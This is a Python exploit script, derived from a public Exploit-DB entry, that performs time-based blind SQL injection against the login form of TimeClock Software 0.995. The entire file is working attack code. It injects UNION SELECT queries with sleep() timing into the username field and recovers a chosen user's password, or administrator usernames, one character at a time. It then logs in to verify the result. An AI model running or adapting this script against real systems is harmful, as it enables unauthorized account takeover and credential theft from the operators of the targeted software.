#! python3
#
# Time-based blind SQL injection for TimeClock Sofware
# Based on TimeClock Software 0.995 - Multiple SQL Injections
# https://www.exploit-db.com/exploits/39404/
#
# Derived from: https://github.com/timip/exploit/blob/master/timeclock.py 
# Tried to increase out of the box reliability for script
# Also added user enumeration


import requests, string, sys
import argparse
import logging

# Script arguments
parser = argparse.ArgumentParser(description='Enumerate password and user for timeclock software')
parser.add_argument('host', help='host to target')
parser.add_argument('--port', default=80, help='port of webserver', type=int)
parser.add_argument('--timeout', type=int, default=5, help='timeout for request, may be increased later by script')
parser.add_argument('--find', choices=['user', 'password'], default='password', help="Do you want to enumerate a user or password?")
parser.add_argument('--user',default='admin', help='username to find password for')
parser.add_argument('-v', dest='verbose', action='store_true', help='enable verbose logging')
args = parser.parse_args()

chars = string.ascii_letters + '0123456789'
url = "http://" + args.host + ":" + str(args.port) + "/index.php"
user = args.user
timeout = args.timeout

if args.verbose:
    logging.basicConfig(level=logging.INFO, format="%(message)s")

if args.find == "password":
    query = "' union SELECT * from user_info WHERE username = '{user}' and substr(password, 1, {clen}) = binary '{password}' and sleep({sleeptime}) -- "
elif args.find == "user":
    query = "' union SELECT * from user_info WHERE level = 'Administrator' and substr(username, 1, {clen}) = binary '{password}' and sleep({sleeptime}) -- "
else:
    print(f"[!] Illegal argument for --find, {args.find} is not a valid value")
    sys.exit(1)

# Confirm user exists
if args.find == "password":
    user_exist=False
    temp_query = f"' union SELECT * from user_info WHERE username = '{user}' and sleep({timeout*5}) -- "
    data =  {"username": temp_query, "password": "pass", "submit": "Log In"}
    try:
        response = requests.post(url,data=data, timeout=timeout)
    except requests.exceptions.Timeout:
        user_exist=True
    if not user_exist:
        print(f"[!] User {user} does not exist, try with a different user")
        sys.exit(1)


print(f"[-] Enumerating {args.find}...")
password = ''
i = 1
while True:
    logging.info(f"[-] Looking for character {i}")
    found = False
    counter = 1
    for c in chars:
        try:
            data = {"username": query.format(user=user, clen=i, password=password+c, sleeptime=timeout*5), "password": "pass", "submit": "Log In"}
            response = requests.post(url,data=data, timeout=timeout)
        except requests.exceptions.Timeout:
            # Confirmation
            logging.info(f"[-] Found character: {c}, confirming")
            try: 
                data = {"username": query.format(user=user, clen=i, password=password + c, sleeptime=timeout*10), "password": "pass", "submit": "Log In"}
                response = requests.post(url,data=data, timeout=timeout*2)
                # Only get past here if confirmation failed
                logging.info(f"[-] Confirmation failed for {c}, continuing")
                timeout += 1
                logging.info(f"[-] Detected higher latency, increased timeout to {timeout}")
            except requests.exceptions.Timeout:
                logging.info("[-] confirmed")
                password += c
                found = True
                break
    if not found and args.find == "password":
        # Check if password complete
        data = {"username":  user, "password": password, "submit": "Log In"}
        response = requests.post(url,data=data)
        if "You are logged in as" in response.text:
            print(f"[+] {args.find} found: {password} for user {user}")
            break
        else:
            print(f"[!] Did not manage to find the correct password, stopping attack. Password so far {password}")
            print(f"[!] For better results increase timeout, or adjust the character set to test")
            break
    elif not found and args.find == "user":
        print(f"[+] User found: {password}")
        break
    else:
        i += 1
        logging.info(f"[-] {args.find} so far {password}")
 
print("[-] Done.")